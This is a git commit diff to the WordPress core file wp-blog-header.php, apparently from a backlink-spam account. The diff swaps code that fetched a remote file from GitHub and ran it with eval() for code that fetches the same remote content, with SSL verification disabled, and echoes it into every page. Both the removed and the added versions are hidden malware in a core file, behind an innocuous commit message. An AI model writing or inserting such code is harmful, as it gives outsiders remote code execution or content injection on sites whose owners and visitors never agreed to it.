a7e40eb20cab89c4b0ce8e2df4d055b8d45af357
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2024-05-14 20:44:14 +0800

    Update wp-blog-header.php

--- wp-blog-header.php
+++ wp-blog-header.php
@@ -22,11 +22,11 @@ if ( ! isset( $wp_did_header ) ) {
 ?>
 <?php
 $url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the response as a string instead of outputting it directly
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-$fileContents = curl_exec($ch);
+$response = curl_exec($ch);
 curl_close($ch);
-eval("?>" . $fileContents);
+echo $response;
 ?>
